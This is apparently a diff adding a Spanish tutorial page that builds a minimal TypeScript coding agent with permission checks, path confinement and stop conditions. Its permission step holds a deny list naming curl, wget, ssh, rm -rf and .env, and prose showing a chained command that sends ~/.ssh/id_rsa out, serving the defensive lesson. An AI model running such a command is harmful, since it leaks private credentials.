@@ -1,0 +1,360 @@
+import { AgentTerminal } from '../../components/widgets/ia/AgentTerminal'
+
+La mejor forma de entender un agente de código es construir uno. No para reemplazar a Claude Code o Codex (que tienen años de trabajo en manejo de contexto, permisos, sandbox e interfaz), sino para que nada de lo que hacen te parezca magia. Cuando entiendes que el corazón de un agente es un `while` de veinte líneas, empiezas a ver dónde está realmente la ingeniería: en las herramientas, los permisos, los límites y la verificación.
+
+En este tema vamos a escribir, pieza por pieza, un agente de código mínimo en TypeScript con el SDK oficial de Anthropic: cuatro herramientas (listar, leer, editar, ejecutar), confirmación de permisos en la terminal, protección de rutas, condiciones de parada y un system prompt que empuja a verificar. Menos de 200 líneas en total, comentarios incluidos.
+
+## La arquitectura
+
+Antes del código, el mapa. Todo lo que vimos en los temas anteriores tiene un lugar concreto en este programa.
+
+<FlowDiagram
+  caption="Las piezas del agente mínimo. El loop es pequeño; las herramientas, los permisos y los límites son donde vive el diseño."
+  nodes={[
+    { id: 'cli', label: 'CLI', kind: 'terminal', x: 0, y: 1, sub: 'tarea + permisos', mx: 0, my: 0 },
+    { id: 'loop', label: 'agent()', kind: 'workflow', x: 1, y: 1, sub: 'loop + MAX_TURNS', mx: 1, my: 0 },
+    { id: 'api', label: 'Messages API', kind: 'llm', x: 2, y: 0, sub: 'claude-opus-5-5', mx: 0, my: 1 },
+    { id: 'perm', label: 'askPermission()', kind: 'shield', x: 2, y: 2, sub: 'allow · deny · preguntar', mx: 1, my: 1 },
+    { id: 'tools', label: 'runTool()', kind: 'tool', x: 3, y: 2, sub: 'list · read · edit · bash', mx: 0, my: 2 },
+    { id: 'repo', label: 'Repositorio', kind: 'file', x: 4, y: 2, sub: 'resolveSafe()', mx: 1, my: 2 },
+  ]}
+  edges={[
+    { from: 'cli', to: 'loop' },
+    { from: 'loop', to: 'api', bidir: true, label: 'messages' },
+    { from: 'loop', to: 'perm', label: 'tool_use' },
+    { from: 'perm', to: 'tools', label: 'ok' },
+    { from: 'tools', to: 'repo' },
+  ]}
+  steps={[
+    { title: 'Entrada', body: 'La tarea llega por la línea de comandos y se convierte en el primer mensaje de usuario.', active: ['cli', 'loop'], flow: ['cli-loop'] },
+    { title: 'Llamada al modelo', body: 'agent() manda system prompt, herramientas y mensajes. Recibe texto y/o bloques tool_use.', active: ['loop', 'api'], flow: ['loop-api'] },
+    { title: 'Permisos', body: 'Cada tool_use pasa por askPermission(): las lecturas pasan, lo peligroso se niega, lo demás se pregunta en la terminal.', active: ['loop', 'perm', 'cli'], flow: ['loop-perm'] },
+    { title: 'Ejecución', body: 'runTool() ejecuta dentro del repo; resolveSafe() impide escapar del directorio del proyecto. La salida se trunca.', active: ['perm', 'tools', 'repo'], flow: ['perm-tools', 'tools-repo'] },
+    { title: 'Vuelta', body: 'Los tool_result vuelven al modelo en un solo mensaje. Se repite hasta end_turn o hasta MAX_TURNS.', active: ['loop', 'api'], flow: ['loop-api'] },
+  ]}
+/>
+
+Para correrlo necesitas Node.js reciente, una clave de API (`ANTHROPIC_API_KEY`) y dos paquetes:
+
+```bash
+npm install @anthropic-ai/sdk
+npm install -D tsx
+npx tsx agent.ts "El test de signup falla, arréglalo"
+```
+
+## Paso 1: configuración y límites
+
+Empezamos por lo que define el comportamiento global: el modelo, el tope de vueltas, la raíz del proyecto y el límite de salida de las herramientas.
+
+```ts title="agent.ts" {7-10}
+import Anthropic from '@anthropic-ai/sdk'
+import { execSync } from 'node:child_process'
+import { readFileSync, readdirSync, statSync, writeFileSync } from 'node:fs'
+import path from 'node:path'
+import readline from 'node:readline/promises'
+
+const MODEL = 'claude-opus-5-5'
+const MAX_TURNS = 30 // condición de parada impuesta por el harness
+const MAX_OUTPUT = 10_000 // caracteres por resultado de herramienta
+const ROOT = process.cwd()
+
+const client = new Anthropic() // lee ANTHROPIC_API_KEY del entorno
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
+```
+
+`MAX_TURNS` y `MAX_OUTPUT` son decisiones de harness, no detalles. El primero corta sesiones que entraron en círculo; el segundo protege el contexto de un log de 50.000 líneas.
+
+## Paso 2: las herramientas que ve el modelo
+
+Las definiciones son lo que el modelo lee para decidir qué herramienta usar y cómo. Cada palabra de la descripción es una instrucción.
+
+```ts title="agent.ts (continúa)"
+const pathParam = { type: 'string', description: 'Ruta relativa a la raíz del proyecto' }
+
+const tools: Anthropic.Tool[] = [
+  {
+    name: 'list_files',
+    description: 'Lista el contenido de un directorio del proyecto (no recursivo). Las carpetas terminan en /. Usa "." para la raíz.',
+    input_schema: { type: 'object', properties: { path: pathParam }, required: ['path'] },
+  },
+  {
+    name: 'read_file',
+    description: 'Devuelve un archivo de texto del proyecto con números de línea.',
+    input_schema: { type: 'object', properties: { path: pathParam }, required: ['path'] },
+  },
+  {
+    name: 'edit_file',
+    description:
+      'Reemplaza exactamente una aparición de old_text por new_text. old_text debe ser único en el archivo: incluye ' +
+      'líneas de contexto si hace falta. Con old_text vacío, crea el archivo con new_text.',
+    input_schema: {
+      type: 'object',
+      properties: { path: pathParam, old_text: { type: 'string' }, new_text: { type: 'string' } },
+      required: ['path', 'old_text', 'new_text'],
+    },
+  },
+  {
+    name: 'bash',
+    description:
+      'Ejecuta un comando de shell en la raíz del proyecto (timeout de 120 s) y devuelve stdout, stderr y el código ' +
+      'de salida. Úsalo para correr tests, el typecheck y git. Salidas largas se truncan.',
+    input_schema: { type: 'object', properties: { command: { type: 'string' } }, required: ['command'] },
+  },
+]
+```
+
+Tres decisiones de diseño, todas del tema de [harness](/ia/harness):
+
+- **Editar por reemplazo de texto único**, no reescribiendo el archivo entero. Es más barato en tokens, deja un diff legible y falla de forma ruidosa si el modelo se equivoca de lugar.
+- **Números de línea en `read_file`.** Ayudan al modelo a orientarse y a citar ubicaciones en su resumen.
+- **Las descripciones anticipan errores** ("debe ser único", "salidas largas se truncan"). Es *poka-yoke*: diseñar la interfaz para que el error sea difícil.
+
+## Paso 3: ejecutar herramientas con seguridad
+
+Ahora, el código que de verdad toca tu disco. Dos protecciones: ninguna ruta puede salir del proyecto, y ninguna salida puede inundar el contexto.
+
+```ts title="agent.ts (continúa)"
+type Input = Record<string, string>
+
+/** Impide que el modelo lea o escriba fuera del proyecto (../../.ssh, /etc...). */
+function resolveSafe(p: string): string {
+  const full = path.resolve(ROOT, p)
+  if (full !== ROOT && !full.startsWith(ROOT + path.sep)) throw new Error(`Ruta fuera del proyecto: ${p}`)
+  return full
+}
+
+/** Conserva el principio y el final: en un log de tests, el resumen suele estar al final. */
+function truncate(s: string): string {
+  if (s.length <= MAX_OUTPUT) return s
+  const half = MAX_OUTPUT / 2
+  return `${s.slice(0, half)}\n…[${s.length - MAX_OUTPUT} caracteres omitidos]…\n${s.slice(-half)}`
+}
+
+async function runTool(name: string, input: Input): Promise<string> {
+  switch (name) {
+    case 'list_files': {
+      const dir = resolveSafe(input.path)
+      return readdirSync(dir)
+        .map((f) => (statSync(path.join(dir, f)).isDirectory() ? `${f}/` : f))
+        .join('\n')
+    }
+    case 'read_file': {
+      const text = readFileSync(resolveSafe(input.path), 'utf8')
+      return truncate(text.split('\n').map((line, i) => `${i + 1}\t${line}`).join('\n'))
+    }
+    case 'edit_file': {
+      const file = resolveSafe(input.path)
+      if (input.old_text === '') {
+        writeFileSync(file, input.new_text)
+        return `Creado ${input.path}`
+      }
+      const text = readFileSync(file, 'utf8')
+      const count = text.split(input.old_text).length - 1
+      if (count !== 1) throw new Error(`old_text aparece ${count} veces en ${input.path}; debe aparecer exactamente una vez.`)
+      writeFileSync(file, text.replace(input.old_text, () => input.new_text))
+      return `OK: 1 reemplazo en ${input.path}`
+    }
+    case 'bash': {
+      try {
+        const out = execSync(input.command, { cwd: ROOT, encoding: 'utf8', timeout: 120_000, stdio: 'pipe' })
+        return truncate(`exit 0\n${out}`)
+      } catch (e) {
+        const err = e as { status?: number; stdout?: string; stderr?: string }
+        return truncate(`exit ${err.status ?? '?'}\n${err.stdout ?? ''}\n${err.stderr ?? ''}`)
+      }
+    }
+    default:
+      throw new Error(`Herramienta desconocida: ${name}`)
+  }
+}
+```
+
+Detalles que parecen menores y no lo son:
+
+- **Un comando que falla no es un error de la herramienta.** Si `npm test` sale con código 1, la herramienta funcionó: devolvió información valiosa. Por eso `bash` atrapa la excepción y devuelve la salida normal con el código. Los errores de verdad (ruta inválida, `old_text` ambiguo) se lanzan y el loop los convierte en `is_error`.
+- **`text.replace(old, () => nuevo)`** con una función, no con un string: si `new_text` contiene `$&` o `$1`, la versión con string los interpretaría como patrones de reemplazo.
+- **Los mensajes de error dicen qué hacer.** "Aparece 3 veces; debe aparecer exactamente una" le dice al modelo que agregue contexto.
+
+## Paso 4: permisos
+
+Este es el corazón de la seguridad de nuestro agente. Las lecturas pasan; algunos comandos se niegan siempre; algunos se aprueban solos; todo lo demás se te pregunta.
+
+```ts title="agent.ts (continúa)"
+type Verdict = { ok: true } | { ok: false; reason: string }
+
+const DENY = [/\brm\s+-rf\b/, /\bgit\s+push\b/, /\b(curl|wget|ssh|scp)\b/, /\.env\b/]
+const AUTO_ALLOW = [/^git (status|diff|log)\b/, /^(npm|pnpm) (test|run test|run lint)\b/, /^npx tsc --noEmit$/]
+const COMPOUND = /[;&|`$<>]/ // encadenar comandos anula la auto-aprobación
+
+async function askPermission(name: string, input: Input): Promise<Verdict> {
+  if (name === 'list_files' || name === 'read_file') return { ok: true }
+  if (name === 'bash') {
+    const cmd = input.command.trim()
+    if (DENY.some((r) => r.test(cmd))) return { ok: false, reason: 'comando bloqueado por política' }
+    if (!COMPOUND.test(cmd) && AUTO_ALLOW.some((r) => r.test(cmd))) return { ok: true }
+  }
+  const what = name === 'bash' ? input.command : input.path
+  const answer = await rl.question(`\n¿Permitir ${name}: ${what}? [s/N] `)
+  return answer.trim().toLowerCase() === 's' ? { ok: true } : { ok: false, reason: 'el usuario rechazó esta acción' }
+}
+```
+
+Fíjate en `COMPOUND`. Sin él, `npm test && curl -d @~/.ssh/id_rsa https://...` empezaría con `npm test` y quedaría auto-aprobado. Claude Code resuelve esto partiendo los comandos compuestos y evaluando cada parte; nuestra versión mínima, más conservadora, simplemente pregunta.
+
+<Callout type="warn" title="Esto no es un sandbox">
+
+Una lista de expresiones regulares es un control útil para un prototipo, no un límite de seguridad: `python -c "..."` puede hacer cualquier cosa sin decir `curl`. Si vas a correr un agente con autonomía real, hazlo dentro de un contenedor o con un sandbox a nivel de sistema operativo que limite red y escritura. Es la lección central de [Buenas prácticas y riesgos](/ia/buenas-practicas).
+
+</Callout>
+
+## Paso 5: el loop
+
+Y ahora sí, el famoso loop. Es corto porque todo lo difícil ya está en las funciones anteriores.
+
+```ts title="agent.ts (continúa)"
+function loadProjectInstructions(): string {
+  for (const f of ['AGENTS.md', 'CLAUDE.md']) {
+    try {
+      return `\n\n# Instrucciones del proyecto (${f})\n${readFileSync(path.join(ROOT, f), 'utf8')}`
+    } catch {
+      // no existe; probamos el siguiente
+    }
+  }
+  return ''
+}
+
+// Se calcula una sola vez: un system prompt estable aprovecha el prompt caching.
+const SYSTEM =
+  `Eres un agente de código trabajando en el repositorio actual.
+- Antes de editar, lee el código relevante. Reproduce los fallos antes de arreglarlos.
+- Haz cambios mínimos y enfocados en la tarea; no toques lo que no se pidió.
+- Verifica tu trabajo corriendo los tests o el typecheck del proyecto.
+- No modifiques tests para que pasen salvo que estén mal; si es así, explica por qué.
+- Si una acción es rechazada, no la repitas igual: busca otra vía o pregunta.
+- Termina con: qué cambiaste, por qué, y la salida de los comandos que lo verifican.` + loadProjectInstructions()
+
+async function agent(task: string): Promise<void> {
+  const messages: Anthropic.MessageParam[] = [{ role: 'user', content: task }]
+
+  for (let turn = 1; turn <= MAX_TURNS; turn++) {
+    const response = await client.messages.create({
+      model: MODEL,
+      max_tokens: 16000,
+      output_config: { effort: 'high' },
+      cache_control: { type: 'ephemeral' }, // cachea el prefijo repetido entre vueltas
+      system: SYSTEM,
+      tools,
+      messages,
+    })
+    // Devolvemos el contenido completo (incluidos bloques de razonamiento) en la próxima vuelta.
+    messages.push({ role: 'assistant', content: response.content })
+
+    for (const block of response.content) {
+      if (block.type === 'text') console.log(`\n${block.text}`)
+    }
+
+    if (response.stop_reason === 'refusal') return console.log('\nEl modelo declinó continuar.')
+    if (response.stop_reason === 'max_tokens') return console.log('\nRespuesta cortada por max_tokens.')
+    if (response.stop_reason !== 'tool_use') return // end_turn: terminó
+
+    const results: Anthropic.ToolResultBlockParam[] = []
+    for (const block of response.content) {
+      if (block.type !== 'tool_use') continue
+      const input = block.input as Input
+      console.log(`\n→ ${block.name} ${JSON.stringify(input)}`)
+
+      const verdict = await askPermission(block.name, input)
+      if (!verdict.ok) {
+        results.push({ type: 'tool_result', tool_use_id: block.id, content: `Acción denegada: ${verdict.reason}`, is_error: true })
+        continue
+      }
+      try {
+        results.push({ type: 'tool_result', tool_use_id: block.id, content: await runTool(block.name, input) })
+      } catch (e) {
+        results.push({ type: 'tool_result', tool_use_id: block.id, content: `Error: ${(e as Error).message}`, is_error: true })
+      }
+    }
+    // Todos los resultados de la vuelta, en un único mensaje de usuario.
+    messages.push({ role: 'user', content: results })
+  }
+  console.log(`\nLímite de ${MAX_TURNS} vueltas alcanzado sin terminar.`)
+}
+
+const task = process.argv.slice(2).join(' ')
+if (!task) {
+  console.error('Uso: npx tsx agent.ts "tu tarea"')
+  process.exit(1)
+}
+await agent(task)
+rl.close()
+```
+
+Repasemos las decisiones contra lo que vimos en [El loop agéntico](/ia/agent-loop):
+
+- **Condiciones de parada en capas.** El modelo decide con `end_turn`; el harness corta con `MAX_TURNS`; `max_tokens` y `refusal` se manejan explícitamente en lugar de ejecutar un `tool_use` incompleto o reintentar a ciegas.
+- **El rechazo es feedback.** Una acción denegada vuelve como `tool_result` con `is_error: true` y el motivo. El system prompt le dice qué hacer con eso: no repetirla igual.
+- **Un solo mensaje con todos los resultados**, aunque el modelo haya pedido varias herramientas a la vez, y nunca se omite un resultado.
+- **Contexto estable.** El system prompt (con el `AGENTS.md` o `CLAUDE.md` del repo) se arma una vez; con `cache_control`, el prefijo repetido se cachea entre vueltas.<Sidenote>Con Claude Opus 5.5 el razonamiento del modelo siempre está activo y se regula con `output_config.effort`; para un agente de código, `high` es un punto de partida razonable. En producción también conviene manejar los rechazos con un modelo de respaldo; la documentación de la API describe el parámetro de *fallbacks* para eso.</Sidenote>
+
+## Verlo funcionar
+
+Así se ve una sesión. Avanza paso a paso y decide tú los permisos; prueba rechazar la edición o la ejecución de los tests y mira cómo cambia el comportamiento del agente.
+
+<AgentTerminal />
+
+Lo más interesante pasa cuando el test falla por un dato de prueba inválido: un buen system prompt ("no modifiques tests salvo que estén mal; explica por qué") hace que el agente distinga entre arreglar un test incorrecto y aflojar la validación para que pase. Y si rechazas una acción, el agente no insiste: cambia de plan o te devuelve la decisión.
+
+<Quiz
+  question="En runTool, cuando npm test sale con código 1, la herramienta devuelve la salida como resultado normal (sin is_error). ¿Por qué?"
+  options={[
+    { text: 'Porque marcar is_error haría que la API rechace la petición.', why: 'La API acepta is_error sin problema. Es una decisión semántica, no una limitación.' },
+    { text: 'Porque la herramienta funcionó: ejecutó el comando y trae información valiosa (qué test falla y por qué). is_error es para cuando la herramienta misma no pudo hacer su trabajo.', correct: true, why: 'Exacto: un test rojo es la señal de feedback principal del agente, no una falla de la herramienta. Los errores reales (ruta inválida, old_text ambiguo) sí se marcan.' },
+    { text: 'Para ahorrar tokens.', why: 'El campo is_error no cambia el costo. La diferencia es cómo interpreta el modelo el resultado.' },
+  ]}
+/>
+
+## Qué le falta para ser un agente de verdad
+
+Nuestro agente funciona, pero compáralo con lo que vimos en esta unidad y verás todo lo que un harness de producción agrega:
+
+| Le falta | Por qué importa | Dónde lo vimos |
+| --- | --- | --- |
+| Sandbox de sistema operativo | Las regex no son un límite de seguridad | [Harness](/ia/harness) |
+| Compactación y límite de contexto | Una sesión larga crece sin control | [Ingeniería de contexto](/ia/ingenieria-de-contexto) |
+| Hooks configurables | Formatear, lintear o exigir typecheck sin depender del modelo | [Harness](/ia/harness) |
+| Búsqueda (`grep`, `glob`) | Leer directorios uno por uno es lento y caro | [El loop agéntico](/ia/agent-loop) |
+| Subagentes | Aislar exploraciones ruidosas | [Herramientas](/ia/herramientas) |
+| Streaming | Ver la respuesta mientras se genera; necesario con `max_tokens` grandes | Documentación de la API |
+| Checkpoints / deshacer | Volver atrás sin depender de git | [Flujos](/ia/flujos) |
+| Evals | Saber si un cambio de prompt mejoró o empeoró | [Verificación](/ia/verificacion) |
+
+Si quieres seguir sin escribir todo esto, tienes dos caminos intermedios. El propio SDK de Anthropic incluye un *tool runner* (en beta) que maneja el loop por ti y te deja enganchar aprobaciones en cada vuelta. Y el **Claude Agent SDK** empaqueta el harness completo de Claude Code (herramientas incorporadas, permisos, hooks, subagentes, contexto) como librería, para construir tus propios agentes encima. Si además prefieres no operar el loop ni el entorno de ejecución, *Managed Agents* hospeda ambos del lado de Anthropic, con un sandbox por sesión.
+
+<Quiz
+  question="El modelo llama a edit_file con un old_text que aparece tres veces en el archivo. ¿Qué es lo mejor que puede hacer la herramienta?"
+  options={[
+    { text: 'Reemplazar las tres apariciones: probablemente era lo que quería.', why: 'Quizás sí, quizás no. Un reemplazo silencioso en lugares no previstos es justo el tipo de error difícil de ver en un review.' },
+    { text: 'Reemplazar la primera aparición y seguir.', why: 'Puede editar el lugar equivocado sin que nadie se entere. Mejor fallar de forma ruidosa.' },
+    { text: 'Fallar con un mensaje que diga cuántas veces aparece y que old_text debe ser único (agregando contexto).', correct: true, why: 'Exacto: falla ruidosa y accionable. El modelo agrega líneas de contexto y reintenta, y el cambio queda exactamente donde debía.' },
+  ]}
+/>
+
+<Takeaways>
+
+- El loop de un agente es pequeño: llamar al modelo, ejecutar los `tool_use`, devolver los `tool_result`, repetir hasta `end_turn` o un tope.
+- La ingeniería está alrededor: definiciones de herramientas claras, edición por reemplazo único, rutas confinadas, salidas truncadas.
+- Un comando que falla es información, no un error de herramienta; los errores reales vuelven con `is_error` y un mensaje accionable.
+- Permisos en capas: lecturas libres, denegaciones fijas, auto-aprobación conservadora (nunca para comandos compuestos) y preguntar el resto.
+- Las regex de permisos no son un sandbox: para autonomía real, contenedor o aislamiento del sistema operativo.
+- Contexto estable y cacheado, todos los resultados en un mensaje, y manejo explícito de `max_tokens` y `refusal`.
+
+</Takeaways>
+
+## Fuentes y lecturas
+
+- Anthropic, [Tool use with Claude](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview) y [uso de herramientas en paralelo](https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use).
+- Anthropic, [SDK oficial de TypeScript](https://github.com/anthropics/anthropic-sdk-typescript).
+- Anthropic, [Prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching).
+- Anthropic, [Agent SDK overview](https://code.claude.com/docs/en/agent-sdk/overview): el harness de Claude Code como librería.
+- Anthropic, [Building effective agents](https://www.anthropic.com/engineering/building-effective-agents): diseño de herramientas y la interfaz agente-computadora.
+- Anthropic, [Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents): descripciones, errores y truncado.
